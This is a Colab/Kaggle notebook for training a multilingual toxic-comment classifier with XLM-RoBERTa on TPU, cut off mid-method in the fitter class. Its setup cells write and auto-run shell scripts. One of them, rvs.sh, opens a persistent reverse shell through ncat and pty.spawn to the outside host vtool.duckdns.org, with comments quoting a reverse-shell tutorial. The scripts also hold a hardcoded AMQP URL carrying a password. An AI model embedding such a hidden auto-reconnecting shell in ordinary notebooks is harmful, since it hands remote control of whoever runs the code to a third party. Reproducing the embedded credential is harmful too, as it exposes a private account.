# -*- coding: utf-8 -*-
# ---
# jupyter:
#   jupytext:
#     text_representation:
#       extension: .py
#       format_name: light
#       format_version: '1.4'
#       jupytext_version: 1.1.7
#   kernelspec:
#     display_name: Python 3
#     name: python3
# ---

# + {"id": "view-in-github", "colab_type": "text", "cell_type": "markdown"}
# <a href="https://colab.research.google.com/github/pennz/kaggle_runner/blob/master/kaggle_runner/hub/shonenkov_training_pipeline.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# + {"colab_type": "text", "id": "wzoWM76m0Rfg", "cell_type": "markdown"}
# ### Dont forget turn on TPU & HIGH-RAM modes :)
#
# Author: [Alex Shonenkov](https://www.kaggle.com/shonenkov) //  shonenkov@phystech.edu

# + {"colab_type": "code", "id": "n6uGvKL3upio", "outputId": "6b29ea48-a25e-41d4-ba7f-ab0aa8fd7eb0", "colab": {"base_uri": "https://localhost:8080/", "height": 54}}
import subprocess

subprocess.run('[ -f setup.py ] || (git clone https://github.com/pennz/kaggle_runner; '
'git submodule update --init --recursive; '
'rsync -r kaggle_runner/.* .; '
'rsync -r kaggle_runner/* .;); '
'python3 -m pip install -e .', shell=True, check=True)

# + {"id": "wV017Cj1CRlg", "colab_type": "code", "colab": {}}
with open("runner.sh", "w") as f:
    f.write(
r"""#!/bin/bash -x
export PS4='Line ${LINENO}: ' # for debug
NC=ncat

USER=$1
shift
REPO=$1
shift
BRANCH=$1
shift
PHASE=$1
shift
ENABLE_RVS=$1
shift

SERVER=$1
shift
PORT=$1
shift

ORIG_PORT=23454

CHECK_PORT=$((ORIG_PORT + 1))
pip install --upgrade pip
conda install -y -c eumetsat expect & # https://askubuntu.com/questions/1047900/unbuffer-stopped-working-months-ago
apt update && apt install -y netcat nmap screen time locales >/dev/null 2>&1
apt install -y mosh iproute2 fish tig ctags htop tree pv tmux psmisc >/dev/null 2>&1 &

conda init bash
cat >> ~/.bashrc << EOF
conda activate base # as my dotfiles will fiddle with conda
export SERVER=$SERVER
export CHECK_PORT=$CHECK_PORT
EOF

source rpt # rvs IDE env setup
export SERVER=$SERVER
export CHECK_PORT=$CHECK_PORT

wait_ncat() {
    wait_for_ncat=$1

    while [ $wait_for_ncat -gt 0 ]; do
        wait_for_ncat=$((wait_for_ncat - 1))
        which ncat >/dev/null && return 0
    done
}
wait_ncat 60

which $NC >/dev/null || NC=nc
export NC

if [ "x${ENABLE_RVS}" = x1 ]; then
    if [ -z $(pgrep -f 'jupyter-notebook') ]; then
        bash ./rvs.sh $SERVER $PORT 2>&1 &
    else
        screen -d -m bash -c "{ echo [REMOTE]: rvs log below.; bash -x ./rvs.sh $SERVER $PORT 2>&1; } | $NC --send-only --no-shutdown -w 120s -i $((3600 * 2))s $SERVER $CHECK_PORT"
    fi
fi &

pip install ripdb pydicom parse pytest-logger python_logging_rabbitmq coverage &
# python3 -m pip install pyvim neovim msgpack==1.0.0 &
# python -m pip install pyvim neovim msgpack==1.0.0 & # for vim

SRC_WORK_FOLDER=/kaggle/working
[ -d ${SRC_WORK_FOLDER} ] || mkdir -p ${SRC_WORK_FOLDER}

cd ${SRC_WORK_FOLDER}

if [ -d ${REPO} ]; then rm -rf ${REPO}; fi

# get code
{
    mvdir() {
        [[ "$2"/"$1" -ef "${PWD}" ]] || {
            rm -rf "$2"/"$1" &&
                mkdir "$2"/"$1"
        }

        bash -c "mv ""$1""/*"" $2""/""$1"
    }
    export -f mvdir

    if [ ! -d ${REPO} ]; then
        git clone --single-branch --branch ${BRANCH} --depth=1 \
            https://github.com/${USER}/${REPO}.git ${REPO} && pushd ${REPO} &&
        sed -i 's/git@\(.*\):\(.*\)/https:\/\/\1\/\2/' .gitmodules &&
        sed -i 's/git@\(.*\):\(.*\)/https:\/\/\1\/\2/' .git/config &&
        git submodule update --init --recursive
        find . -maxdepth 1 -name ".??*" -o -name "??*" -type f | xargs -I{} mv {} $OLDPWD
        find . -maxdepth 1 -name ".??*" -o -name "??*" -type d | xargs -I{} bash -x -c "mvdir {}  $OLDPWD"
        popd
    fi
    pip install -e . &
    make install_dep >/dev/null
}

USE_AMQP=true
export USE_AMQP

conda init bash
source ~/.bashrc
conda activate base

if [ x"${PHASE}" = x"dev" ]; then
    export PS4='[Remote]: Line ${LINENO}: '
    (
        echo "MOSHing"
        make mosh
    ) &

    make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi &
    wait # not exit, when dev
fi

if [ x"${PHASE}" = x"data" ]; then
    bash ./rvs.sh $SERVER $PORT >/dev/null & # just keep one rvs incase
    make dataset
fi

if [ x"${PHASE}" = x"test" ]; then
    bash ./rvs.sh $SERVER $PORT >/dev/null & # just keep one rvs incase
    #make test
fi

if [ x"${PHASE}" = x"run" ]; then
    #pip install kaggle_runner
    bash ./rvs.sh $SERVER $PORT >/dev/null & make m & # just keep one rvs incase
    make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi
    # basically the reverse of the calling path
    pkill make & pkill -f "mosh" & pkill sleep & pkill -f "rvs.sh" & pkill ncat &
    # python main.py "$@"
fi
"""
    )
with open("rvs.sh", "w") as f:
    f.write(
r"""#!/bin/bash -x
export PS4='Line ${LINENO}: ' # for debug

NC=${NC:-ncat}
type $NC || ( echo >&2 "$NC cannot be found. Exit."; exit 1;)
# https://stackoverflow.com/questions/57877451/retrieving-output-and-exit-code-of-a-coprocess
# coproc { sleep 30 && echo "Output" && exit 3; }
# Saving the coprocess's PID for later, as COPROC_PID apparently unsets when its finished
# COPROC_PID_backup=$COPROC_PID
#
# Retrieving the coprocess's output
# output=$(cat <&$COPROC)
#
# Retrieving the coprocess's exit code
# wait $COPROC_PID_backup
#
# Echoing out the results
# echo $?
# echo $output

echo BASH NOW: $BASHPID

PID_FILE_PATH=/tmp/nc.pid
EXIT_FILE_PATH=/tmp/rvs_exit.$BASHPID.pid

test -f $EXIT_FILE_PATH && rm $EXIT_FILE_PATH

SERVER=$1
shift
PORT=$1
shift

ORIG_PORT=23454
CHECK_PORT=$((ORIG_PORT + 1))

check_exit_status() {
  [ -f /tmp/rvs_return ] && return 0

  if [ -f $EXIT_FILE_PATH ] && [ x"$(cat $EXIT_FILE_PATH)" = x0 ]; then
    return 0
  fi

  return 1 # not ok
}


connect_setup() {
  connect_again_flag=1

  sleep_time=5

  while [ ${connect_again_flag} -eq 1 ]; do
    check_exit_status && return 0

    $NC -w ${1}s -i 1800s $SERVER $PORT -c "echo $(date) started connection; echo $HOSTNAME; python -c 'import pty; pty.spawn([\"/bin/bash\", \"-li\"])'"

    RSRET=$?
    echo $RSRET > $EXIT_FILE_PATH
    (/bin/ss -lpants | grep "ESTAB.*$PORT") || >&2 echo "\"$NC -w ${1}s -i 1800s $SERVER $PORT\" return with code $RSRET"

    if [ x"$RSRET" = x"0" ]; then
      [ -f /tmp/rvs_exit ] && return 0

      return 255 # just do not return
    fi
    [ $RSRET -eq 0 ] && connect_again_flag=0
    [ $RSRET -eq 1 ] && sleep ${sleep_time} && sleep_time=$((sleep_time + sleep_time))
  done
  # exit, will cause rvs script exit, beside, RSRET not 0, mean connection loss
  # thing
  RSRET=1  # just never exit
  echo $RSRET > $EXIT_FILE_PATH && return $RSRET
}

connect_again() {
  # pkill -f "nc.*$PORT"  # no need now, our listen server can accept multiple
  # connection now
  connect_setup $1
}

WAIT_LIMIT=2048
INIT_WAIT=8
port_connect_status=0
wait_time=$INIT_WAIT

floatToInt() {
  parsed=$(printf "%.0f" "$@")
  [ ! $? -eq 0 ] && parsed=0
  echo $parsed
} 2> /dev/null

while true; do
  check_exit_status && exit 0
  # if find that server cannot be connected, we try to restart our reverse connect again
  nc_time=$($(which time) -f "%e" $NC -zw $wait_time $SERVER $CHECK_PORT 2>&1 > /dev/null)
  nc_ret=$?
  nc_time=$(echo $nc_time | awk '{print $NF}')
  nc_time=$(floatToInt $nc_time)

  if [ ${nc_ret} -eq 0 ]; then
    # recover connection, need to connect_again too. For 1st time, will try to connect
    # no connection last time, have connction now

    if [ $port_connect_status -eq 0 ]; then
      echo "recover connection, reset wait_time and try to reconnect"
      wait_time=$INIT_WAIT
      # previous connection is lost, we wait for longer to setup connection
      check_exit_status || wait_time=15
      connect_again $wait_time &
    else
      wait_time=$((wait_time + wait_time)) # double wait, network fine

      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi
    fi
    port_connect_status=1
  else
    if [ $port_connect_status -eq 1 ]; then
      echo "found connection loss, reset wait_time and try to reconnect"
      wait_time=$INIT_WAIT
      check_exit_status || wait_time=15 # previous connection is lost
      connect_again $wait_time &
    else # no connection all the time? we still try to connect...
      wait_time=$((wait_time + wait_time))

      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi
      connect_again $wait_time &
    fi
    port_connect_status=0
  fi
  sleep $((wait_time - nc_time)) # check every XX seconds
  echo $hostname $HOSTNAME
done
wait  # wait for any background

# https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e
# In reverse shell
# $ python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
#
# In Attacker console
# $ stty raw -echo
# $ fg
#
# In reverse shell
# $ reset
# $ export SHELL=bash
# $ export TERM=xterm-256color
# $ stty rows <num> columns <cols>
"""
    )
with open("rpt", "w") as f:
    f.write(
r"""#!/bin/bash
[ -d ~/.fzf ] || {
git clone --depth=1 https://github.com/pennz/dotfiles
rsync -r dotfiles/.* ~
rsync -r dotfiles/* ~
pushd ~
git submodule update --init
.fzf/install --all
curl -fLo ~/.config/nvim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
# vim -u ~/.vimrc_back "+call plug#begin()" +PlugInstall +qa &
# ( sleep 60; nvim -Vnvim_log -u ~/.vimrc_back "+call plug#begin()" +PlugInstall +checkhealth +qa )&
ln -s .shrc_customised.macos .shrc_customised
echo "alias gdrive='gdrive  --service-account a.json'" >> ~/.bash_aliases
echo "unalias vim" >> ~/.bash_aliases
echo "alias vim='nvim -u ~/.vimrc_back'" >> ~/.bash_aliases
popd

cat >> ~/.profile << EOF
export SHELL=/bin/bash
export TERM=screen-256color
stty intr ^\c susp ^\x eof ^\f echo opost
# https://unix.stackexchange.com/questions/343088/what-is-the-equivalent-of-stty-echo-for-zsh
# unsetopt ZLE # for zsh
# for ourside stty raw isig -echo icrnl time 3 echoprt opost eof ^\p

color_my_prompt () {
    local __user_and_host="\[\033[01;32m\]\u@\h"
    local __cur_location="\[\033[01;34m\]\w"
    local __git_branch_color="\[\033[31m\]"
    # local __git_branch="\`ruby -e \"print (%x{git branch 2> /dev/null}.grep(/^\*/).first || '').gsub(/^\* (.+)$/, '(\1) ')\"\`"
    local __git_branch='`git branch 2> /dev/null | grep -e ^* | ${SED:-sed} -E  s/^\\\\\*\ \(.+\)$/\(\\\\\1\)\ /`'
    local __prompt_tail="\[\033[35m\]$"
    local __last_color="\[\033[00m\]"
    export PS1="$__user_and_host $__cur_location $__git_branch_color$__git_branch$__prompt_tail$__last_color "
}

ENV=/root/.bashrc
PYTHONWARNINGS=ignore:::pip._internal.cli.base_command
MPLBACKEND=module://ipykernel.pylab.backend_inline

PS4="$HOSTNAME: "'${LINENO}: '
_=/usr/bin/env
PWD=/kaggle/working
cd $PWD
OLDPWD=/root

# color_my_prompt
locale-gen
echo "#" $(grep 'cpu ' /proc/stat >/dev/null;sleep 0.1;grep 'cpu ' /proc/stat | awk -v RS="" '{print "CPU: "($13-$2+$15-$4)*100/($13-$2+$15-$4+$16-$5)"%"}') "Mem: "$(awk '/MemTotal/{t=$2}/MemAvailable/{a=$2}END{print 100-100*a/t"%"}' /proc/meminfo) "Uptime: "$(uptime | awk '{print $1 " " $2 " " $3}')
echo "#" TPU_NAME=$TPU_NAME
nvidia-smi
conda activate base
EOF
}
"""
    )
with open("gdrive_setup", "w") as f:
    f.write(
r"""#!/bin/bash
wget https://github.com/gdrive-org/gdrive/releases/download/2.1.0/gdrive-linux-x64
chmod +x gdrive-linux-x64
cp gdrive-linux-x64 /bin/gdrive

mkdir ~/.gdrive

# auth file
cat > ~/.gdrive/a.json << EOF
NO_PASS

EOF

gdrive --service-account a.json list  # just test

SRC_WORK_FOLDER=/kaggle/input
[ -d ${SRC_WORK_FOLDER} ] || {
    mkdir -p ${SRC_WORK_FOLDER}
    cd ${SRC_WORK_FOLDER}
    gdrive --service-account a.json download -r 1CHDWIN0M6PD4SQyplbWefBCzNzdPVd-m
    tar xf siim-train-test.tar.gz -C /kaggle/input
}
# cat > tgz_files.sh << EOF
# #!/bin/bash
# tgzfile () {
#   tar cf - $1 -P | pv -s $(du -sb $1 | awk '{print $1}') | gzip > /home/$1.tar.gz
# }
# cd /kaggle/input
# find . -maxdepth 1 -type d -name "??*" | while read -r line; do
#     echo $line
#     tgzfile $line
# done
# EOF
"""
    )

# + {"id": "fk22W4JeCRlm", "colab_type": "code", "colab": {}}
import os
server = "vtool.duckdns.org"
os.environ['SERVER'] = server

entry_str = r"""#!/bin/bash
PS4='Line ${LINENO}: ' bash -x runner.sh pennz kaggle_runner master "test" 1 """+ server +""" "9017" "amqp://kaggle:9b83ca70cf4cda89524d2283a4d675f6@pengyuzhou.com/" "384" "19999" "intercept" | tee runner_log
"""
if False:
    entry_str += r"""PS4='Line ${LINENO}: ' bash -x gdrive_setup >>loggdrive &"""

with open("entry.sh", "w") as f:
    f.write(entry_str)

# + {"id": "UAC8442XCRlq", "colab_type": "code", "outputId": "3b52996b-c161-4279-f8a7-ab6b45e88e3e", "colab": {"base_uri": "https://localhost:8080/", "height": 34}}
import os
import sys
sys.path.append(os.getcwd())

import selectors
import subprocess
from importlib import reload, import_module
import_module('kaggle_runner')
from kaggle_runner import logger
logger.debug("Logger loaded. Will run entry.sh.")

# + {"id": "mC6qgI68EMQm", "colab_type": "code", "colab": {}}
import subprocess
p = subprocess.run(
'bash -x entry.sh &',shell=True)

# + {"colab_type": "code", "id": "HsZb7QICuRIe", "outputId": "cbb9b6cb-669d-41c5-d6a1-650228728751", "colab": {"base_uri": "https://localhost:8080/", "height": 955}}
# !curl https://raw.githubusercontent.com/pytorch/xla/master/contrib/scripts/env-setup.py -o pytorch-xla-env-setup.py > /dev/null
# !python pytorch-xla-env-setup.py --version 20200420 --apt-packages libomp5 libopenblas-dev
# !pip install transformers==2.5.1 > /dev/null
# !pip install pandarallel > /dev/null
# !pip install catalyst==20.4.2 > /dev/null

# + {"id": "KFZrVc5nCRlw", "colab_type": "code", "outputId": "b21d3de4-5ea2-4233-9736-36261b7de356", "colab": {"base_uri": "https://localhost:8080/", "height": 156}}
import numpy as np
import pandas as pd

import os
os.environ['XLA_USE_BF16'] = "1"

from glob import glob

import torch
import torch.nn as nn
from torch.utils.data import Dataset,DataLoader
from torch.autograd import Variable
from torch.utils.data.sampler import SequentialSampler, RandomSampler
import sklearn

import time
import random
from datetime import datetime
from tqdm import tqdm
tqdm.pandas()

from transformers import BertModel, BertTokenizer
from transformers import XLMRobertaModel, XLMRobertaTokenizer
from transformers import AdamW, get_linear_schedule_with_warmup, get_constant_schedule
from catalyst.data.sampler import DistributedSamplerWrapper, BalanceClassSampler

import gc
import re

# # !pip install nltk > /dev/null
import nltk
nltk.download('punkt')

from nltk import sent_tokenize

from pandarallel import pandarallel

pandarallel.initialize(nb_workers=4, progress_bar=False)

# + {"colab_type": "code", "id": "M-VP4QbZu9EB", "colab": {}}
SEED = 42

MAX_LENGTH = 224
BACKBONE_PATH = 'xlm-roberta-large'
# ROOT_PATH = f'..'
ROOT_PATH = f'/kaggle' # for colab


def seed_everything(seed):
    random.seed(seed)
    os.environ['PYTHONHASHSEED'] = str(seed)
    np.random.seed(seed)
    torch.manual_seed(seed)
    torch.cuda.manual_seed(seed)
    torch.backends.cudnn.deterministic = True
    torch.backends.cudnn.benchmark = True

seed_everything(SEED)

# + {"colab_type": "code", "id": "63ceMzcxu9GS", "outputId": "d78a51d9-9e15-4793-e70f-2b222231e842", "colab": {"base_uri": "https://localhost:8080/", "height": 86}}
from nltk import sent_tokenize
from random import shuffle
import random
import albumentations
from albumentations.core.transforms_interface import DualTransform, BasicTransform


LANGS = {
    'en': 'english',
    'it': 'italian',
    'fr': 'french',
    'es': 'spanish',
    'tr': 'turkish',
    'ru': 'russian',
    'pt': 'portuguese'
}

def get_sentences(text, lang='en'):
    return sent_tokenize(text, LANGS.get(lang, 'english'))

def exclude_duplicate_sentences(text, lang='en'):
    sentences = []

    for sentence in get_sentences(text, lang):
        sentence = sentence.strip()

        if sentence not in sentences:
            sentences.append(sentence)

    return ' '.join(sentences)

def clean_text(text, lang='en'):
    text = str(text)
    text = re.sub(r'[0-9"]', '', text)
    text = re.sub(r'#[\S]+\b', '', text)
    text = re.sub(r'@[\S]+\b', '', text)
    text = re.sub(r'https?\S+', '', text)
    text = re.sub(r'\s+', ' ', text)
    text = exclude_duplicate_sentences(text, lang)

    return text.strip()


class NLPTransform(BasicTransform):
    """ Transform for nlp task."""

    @property
    def targets(self):
        return {"data": self.apply}

    def update_params(self, params, **kwargs):
        if hasattr(self, "interpolation"):
            params["interpolation"] = self.interpolation

        if hasattr(self, "fill_value"):
            params["fill_value"] = self.fill_value

        return params

    def get_sentences(self, text, lang='en'):
        return sent_tokenize(text, LANGS.get(lang, 'english'))

class ShuffleSentencesTransform(NLPTransform):
    """ Do shuffle by sentence """
    def __init__(self, always_apply=False, p=0.5):
        super(ShuffleSentencesTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        sentences = self.get_sentences(text, lang)
        random.shuffle(sentences)

        return ' '.join(sentences), lang

class ExcludeDuplicateSentencesTransform(NLPTransform):
    """ Exclude equal sentences """
    def __init__(self, always_apply=False, p=0.5):
        super(ExcludeDuplicateSentencesTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        sentences = []

        for sentence in self.get_sentences(text, lang):
            sentence = sentence.strip()

            if sentence not in sentences:
                sentences.append(sentence)

        return ' '.join(sentences), lang

class ExcludeNumbersTransform(NLPTransform):
    """ exclude any numbers """
    def __init__(self, always_apply=False, p=0.5):
        super(ExcludeNumbersTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        text = re.sub(r'[0-9]', '', text)
        text = re.sub(r'\s+', ' ', text)

        return text, lang

class ExcludeHashtagsTransform(NLPTransform):
    """ Exclude any hashtags with # """
    def __init__(self, always_apply=False, p=0.5):
        super(ExcludeHashtagsTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        text = re.sub(r'#[\S]+\b', '', text)
        text = re.sub(r'\s+', ' ', text)

        return text, lang

class ExcludeUsersMentionedTransform(NLPTransform):
    """ Exclude @users """
    def __init__(self, always_apply=False, p=0.5):
        super(ExcludeUsersMentionedTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        text = re.sub(r'@[\S]+\b', '', text)
        text = re.sub(r'\s+', ' ', text)

        return text, lang

class ExcludeUrlsTransform(NLPTransform):
    """ Exclude urls """
    def __init__(self, always_apply=False, p=0.5):
        super(ExcludeUrlsTransform, self).__init__(always_apply, p)

    def apply(self, data, **params):
        text, lang = data
        text = re.sub(r'https?\S+', '', text)
        text = re.sub(r'\s+', ' ', text)

        return text, lang


# + {"colab_type": "code", "id": "uFB3UeyAsYCp", "colab": {}}
class SynthesicOpenSubtitlesTransform(NLPTransform):
    def __init__(self, always_apply=False, p=0.5):
        super(SynthesicOpenSubtitlesTransform, self).__init__(always_apply, p)
        df = pd.read_csv(f'{ROOT_PATH}/input/open-subtitles-toxic-pseudo-labeling/open-subtitles-synthesic.csv', index_col='id')[['comment_text', 'toxic', 'lang']]
        df = df[~df['comment_text'].isna()]
        df['comment_text'] = df.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)
        df = df.drop_duplicates(subset='comment_text')
        df['toxic'] = df['toxic'].round().astype(np.int)

        self.synthesic_toxic = df[df['toxic'] == 1].comment_text.values
        self.synthesic_non_toxic = df[df['toxic'] == 0].comment_text.values

        del df
        gc.collect();

    def generate_synthesic_sample(self, text, toxic):
        texts = [text]

        if toxic == 0:
            for i in range(random.randint(1,5)):
                texts.append(random.choice(self.synthesic_non_toxic))
        else:
            for i in range(random.randint(0,2)):
                texts.append(random.choice(self.synthesic_non_toxic))

            for i in range(random.randint(1,3)):
                texts.append(random.choice(self.synthesic_toxic))
        random.shuffle(texts)

        return ' '.join(texts)

    def apply(self, data, **params):
        text, toxic = data
        text = self.generate_synthesic_sample(text, toxic)

        return text, toxic


# + {"colab_type": "code", "id": "K5BdJ9HWvnLW", "outputId": "eeadb258-3d56-4b38-90f2-a749d74ba483", "colab": {"base_uri": "https://localhost:8080/", "height": 34, "referenced_widgets": ["845fc7a27787461e95026f1d36f4ef8b", "9fa9c3af9c804ec29d87fa5300fa657d", "a6b7a79f1c524356b800c64df25d7284", "c2c417dab722401a909327db58b48033"]}}
def get_train_transforms():
    return albumentations.Compose([
        ExcludeUsersMentionedTransform(p=0.95),
        ExcludeUrlsTransform(p=0.95),
        ExcludeNumbersTransform(p=0.95),
        ExcludeHashtagsTransform(p=0.95),
        ExcludeDuplicateSentencesTransform(p=0.95),
    ], p=1.0)

def get_synthesic_transforms():
    return SynthesicOpenSubtitlesTransform(p=0.5)


train_transforms = get_train_transforms();
synthesic_transforms = get_synthesic_transforms()
tokenizer = XLMRobertaTokenizer.from_pretrained(BACKBONE_PATH)
shuffle_transforms = ShuffleSentencesTransform(always_apply=True)


# + {"colab_type": "code", "id": "qFp80AuJu9Ii", "colab": {}}
def onehot(size, target, aux=None):
    if aux is not None:
        vec = np.zeros(size+len(aux), dtype=float32)
        vec[target] = 1.
        vec[2:] = aux
        vec = torch.tensor(vec, dtype=torch.float32)
    else:
        vec = torch.zeros(size, dtype=torch.float32)
        vec[target] = 1.

    return vec

from kaggle_runner import may_debug

class DatasetRetriever(Dataset):
    def __init__(self, labels_or_ids, comment_texts, langs,
                 severe_toxic, obscene, threat, insult, identity_hate,
                 use_train_transforms=False, test=False, use_aux=True):
        self.test = test
        self.labels_or_ids = labels_or_ids
        self.comment_texts = comment_texts
        self.langs = langs
        self.severe_toxic = severe_toxic
        self.obscene = obscene
        self.threat = threat
        self.insult = insult
        self.identity_hate = identity_hate
        self.use_train_transforms = use_train_transforms
        self.aux = None

        if use_aux:
            self.aux = [self.severe_toxic, self.obscene, self.threat, self.insult, self.identity_hate]

    def get_tokens(self, text):
        encoded = tokenizer.encode_plus(
            text,
            add_special_tokens=True,
            max_length=MAX_LENGTH,
            pad_to_max_length=True
        )

        return encoded['input_ids'], encoded['attention_mask']

    def __len__(self):
        return self.comment_texts.shape[0]

    def __getitem__(self, idx):
        text = self.comment_texts[idx]
        lang = self.langs[idx]

        if self.test is False:
            label = self.labels_or_ids[idx]
            may_debug()
            target = onehot(2, label, aux=self.aux)

        if self.use_train_transforms:
            text, _ = train_transforms(data=(text, lang))['data']
            tokens, attention_mask = self.get_tokens(str(text))
            token_length = sum(attention_mask)

            if token_length > 0.8*MAX_LENGTH:
                text, _ = shuffle_transforms(data=(text, lang))['data']
            elif token_length < 60:
                text, _ = synthesic_transforms(data=(text, label))['data']
            else:
                tokens, attention_mask = torch.tensor(tokens), torch.tensor(attention_mask)

                return target, tokens, attention_mask

        tokens, attention_mask = self.get_tokens(str(text))
        tokens, attention_mask = torch.tensor(tokens), torch.tensor(attention_mask)

        if self.test is False:
            return target, tokens, attention_mask

        return self.labels_or_ids[idx], tokens, attention_mask

    def get_labels(self):
        return list(np.char.add(self.labels_or_ids.astype(str), self.langs))


# + {"colab_type": "code", "id": "3DVkkUVMu9Ka", "outputId": "2434e74b-0f48-41e7-aa86-a9b8a8984772", "colab": {"base_uri": "https://localhost:8080/", "height": 173}}
# %%time

df_train = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-public-baseline-train-data/train_data.csv')


train_dataset = DatasetRetriever(
    labels_or_ids=df_train['toxic'].values,
    comment_texts=df_train['comment_text'].values,
    langs=df_train['lang'].values,
    severe_toxic=df_train['severe_toxic'].values,
    obscene=df_train['obscene'].values,
    threat=df_train['threat'].values,
    insult=df_train['insult'].values,
    identity_hate=df_train['identity_hate'].values,
    use_train_transforms=True,
)

del df_train
gc.collect();

for targets, tokens, attention_masks in train_dataset:
    break

print(targets)
print(tokens.shape)
print(attention_masks.shape)

# + {"colab_type": "code", "id": "PlcGdUdSYewm", "outputId": "3f81ef87-94f8-45a1-9011-3addf641e5bb", "colab": {"base_uri": "https://localhost:8080/", "height": 52}}
np.unique(train_dataset.get_labels())

# + {"colab_type": "code", "id": "bW4dEWaYu9NF", "outputId": "7223d7c0-1b1c-40bf-b821-998b39d4f466", "colab": {"base_uri": "https://localhost:8080/", "height": 69}}
df_val = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-multilingual-toxic-comment-classification/validation.csv', index_col='id')

validation_tune_dataset = DatasetRetriever(
    labels_or_ids=df_val['toxic'].values,
    comment_texts=df_val['comment_text'].values,
    langs=df_val['lang'].values,
    use_train_transforms=True,
)

df_val['comment_text'] = df_val.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)

validation_dataset = DatasetRetriever(
    labels_or_ids=df_val['toxic'].values,
    comment_texts=df_val['comment_text'].values,
    langs=df_val['lang'].values,
    use_train_transforms=False,
)

del df_val
gc.collect();

for targets, tokens, attention_masks in validation_dataset:
    break

print(targets)
print(tokens.shape)
print(attention_masks.shape)

# + {"colab_type": "code", "id": "zNdADp28v3av", "outputId": "56519c84-55fa-4de1-da37-ac4578fba3b9", "colab": {"base_uri": "https://localhost:8080/", "height": 69}}
df_test = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-multilingual-toxic-comment-classification/test.csv', index_col='id')
df_test['comment_text'] = df_test.parallel_apply(lambda x: clean_text(x['content'], x['lang']), axis=1)

test_dataset = DatasetRetriever(
    labels_or_ids=df_test.index.values,
    comment_texts=df_test['comment_text'].values,
    langs=df_test['lang'].values,
    use_train_transforms=False,
    test=True
)

del df_test
gc.collect();

for ids, tokens, attention_masks in test_dataset:
    break

print(ids)
print(tokens.shape)
print(attention_masks.shape)


# + {"colab_type": "code", "id": "I2bN_NySwU6c", "colab": {}}
class RocAucMeter(object):
    def __init__(self):
        self.reset()

    def reset(self):
        self.y_true = np.array([0,1])
        self.y_pred = np.array([0.5,0.5])
        self.score = 0

    def update(self, y_true, y_pred):
        y_true = y_true.cpu().numpy().argmax(axis=1)
        y_pred = nn.functional.softmax(y_pred, dim=1).data.cpu().numpy()[:,1]
        self.y_true = np.hstack((self.y_true, y_true))
        self.y_pred = np.hstack((self.y_pred, y_pred))
        self.score = sklearn.metrics.roc_auc_score(self.y_true, self.y_pred, labels=np.array([0, 1]))

    @property
    def avg(self):
        return self.score

class AverageMeter(object):
    """Computes and stores the average and current value"""
    def __init__(self):
        self.reset()

    def reset(self):
        self.val = 0
        self.avg = 0
        self.sum = 0
        self.count = 0

    def update(self, val, n=1):
        self.val = val
        self.sum += val * n
        self.count += n
        self.avg = self.sum / self.count


# + {"colab_type": "code", "id": "arcC5IeYxUbr", "colab": {}}
class LabelSmoothing(nn.Module):
    def __init__(self, smoothing = 0.1):
        super(LabelSmoothing, self).__init__()
        self.confidence = 1.0 - smoothing
        self.smoothing = smoothing

    def forward(self, x, target):
        if self.training:
            x = x.float()
            target = target.float()
            logprobs = torch.nn.functional.log_softmax(x, dim = -1)

            nll_loss = -logprobs * target
            nll_loss = nll_loss.sum(-1)

            smooth_loss = -logprobs.mean(dim=-1)

            loss = self.confidence * nll_loss + self.smoothing * smooth_loss

            return loss.mean()
        else:
            return torch.nn.functional.cross_entropy(x, target)


# + {"colab_type": "code", "id": "Ow13PTlFwbiH", "colab": {}}
import warnings

warnings.filterwarnings("ignore")

import torch_xla
import torch_xla.core.xla_model as xm
import torch_xla.distributed.parallel_loader as pl
import torch_xla.distributed.xla_multiprocessing as xmp

from catalyst.data.sampler import DistributedSamplerWrapper, BalanceClassSampler

class TPUFitter:

    def __init__(self, model, device, config):
        if not os.path.exists('node_submissions'):
            os.makedirs('node_submissions')

        self.config = config
        self.epoch = 0
        self.log_path = 'log.txt'

        self.model = model
        self.device = device

        param_optimizer = list(self.model.named_parameters())
        no_decay = ['bias', 'LayerNorm.bias', 'LayerNorm.weight']
        optimizer_grouped_parameters = [
            {'params': [p for n, p in param_optimizer if not any(nd in n for nd in no_decay)], 'weight_decay': 0.001},
            {'params': [p for n, p in param_optimizer if any(nd in n for nd in no_decay)], 'weight_decay': 0.0}
        ]

        self.optimizer = AdamW(optimizer_grouped_parameters, lr=config.lr*xm.xrt_world_size())
        self.scheduler = config.SchedulerClass(self.optimizer, **config.scheduler_params)

        self.criterion = config.criterion
        xm.master_print(f'Fitter prepared. Device is {self.device}')

    def fit(self, train_loader, validation_loader):
        for e in range(self.config.n_epochs):
            if self.config.verbose:
                lr = self.optimizer.param_groups[0]['lr']
                timestamp = datetime.utcnow().isoformat()
                self.log(f'\n{timestamp}\nLR: {lr}')

            t = time.time()
            para_loader = pl.ParallelLoader(train_loader, [self.device])
            losses, final_scores = self.train_one_epoch(para_loader.per_device_loader(self.device))

            self.log(f'[RESULT]: Train. Epoch: {self.epoch}, loss: {losses.avg:.5f}, final_score: {final_scores.avg:.5f}, time: {(time.time() - t):.5f}')

            t = time.time()
            para_loader = pl.ParallelLoader(validation_loader, [self.device])
